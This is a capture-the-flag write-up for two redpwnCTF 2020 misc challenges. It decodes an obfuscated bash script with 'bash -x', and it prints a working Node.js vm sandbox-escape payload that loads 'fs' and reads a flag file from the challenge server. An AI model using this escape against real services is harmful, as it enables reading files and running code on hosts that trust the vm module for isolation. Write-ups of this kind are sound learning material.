---
title: "redpwnCTF 2020 Misc"
date: 2020-06-29T14:16:00+00:00
weight: 9997
# aliases: ["/first"]
tags: ["writeup", "misc", "redpwnctf"]
author: "Me"
# author: ["Me", "You"] # multiple authors
showToc: true
TocOpen: true
draft: false
hidemeta: false
comments: false
description: "Writeups on misc challenges for redpwnCTF 2020"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
---

<img src="/img/misc.png">

---

## uglybash
**Category:** Misc

**Points:** 359

**Description:**
> This bash script evaluates to echo dont just run it, dummy # flag{...} where the flag is in the comments.
>
> The comment won't be visible if you just execute the script. How can you mess with bash to get the value right before it executes?
>
> Enjoy the intro misc chal.
>
> **Author:** arinerron
>
> **Given:** cmd.sh

### Writeup
When looking at the file, we see a bunch of gibberish bash. I did some research
and found a way to "debug" a script in bash.

The command is simple:
```
bash -x <program>
```

After running this, we see all commands ran in bash. We can do some parsing
through this debug output and retrieve:
```
+++ printf %s e
+++ printf %s c
+++ printf %s h
+++ printf %s o
+++ printf %s ' '
+++ printf %s d
+++ printf %s o
+++ printf %s n
+++ printf %s t
+++ printf %s ' '
+++ printf %s j
+++ printf %s u
+++ printf %s s
+++ printf %s t
+++ printf %s ' '
+++ printf %s r
+++ printf %s u
+++ printf %s n
+++ printf %s ' '
+++ printf %s i
+++ printf %s t
+++ printf %s ,
+++ printf %s ' '
+++ printf %s d
+++ printf %s u
+++ printf %s m
+++ printf %s m
+++ printf %s y
+++ printf %s ' '
+++ printf %s #
+++ printf %s ' '
+++ printf %s f
+++ printf %s l
+++ printf %s a
+++ printf %s g
+++ printf %s {
+++ printf %s u
+++ printf %s s
+++ printf %s 3
+++ printf %s _
+++ printf %s z
+++ printf %s s
+++ printf %s h
+++ printf %s ,
+++ printf %s _
+++ printf %s d
+++ printf %s u
+++ printf %s m
+++ printf %s m
+++ printf %s y
+++ printf %s }
```

Evaluating to:
```
dont just run it, dummy # flag{us3_zsh,_dummy}
```

### Flag
`flag{us3_zsh,_dummy}`

---

## CaasiNO
**Category:** Misc

**Points:** 402

**Description:**
> Who needs regex for sanitization when we have VMs?!?!
>
> The flag is at /ctf/flag.txt0
>
> `nc 2020.redpwnc.tf 31273`
>
> **Author:** asphyxia
>
> **Given:** calculator.js

### Writeup
This one isn't as easy for me to explain because I don't understand FULLY how
I am able to get this flag. From my understanding, we are in a JavaScript VM,
which allows us to run some simple JavaScript. I don't know all that much JavaScript,
but I was able to do some research to find out that this vm is escapable.

I started out by seeing:
```
> this.constructor.constructor()
function anonymous(
) {

}
```

This gave me a little inspiration to try to find the flag. I messed around with
this for a while to try to get further and further. I then was able to return this
"process" object, which I was sure had many resources. I was right.
```
> this.constructor.constructor("return this")().process
[object process]
```

I fumbled around with more code and functions until I came across this beauty:
```
> new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()("fs").readFileSync("ctf/flag.txt")
flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}
```

### Flag
`flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}`

### Resources
[readFileSync](https://www.geeksforgeeks.org/node-js-fs-readfilesync-method/?ref=leftbar-rightbar)

[Main idea](https://github.com/gf3/sandbox/issues/50)

---


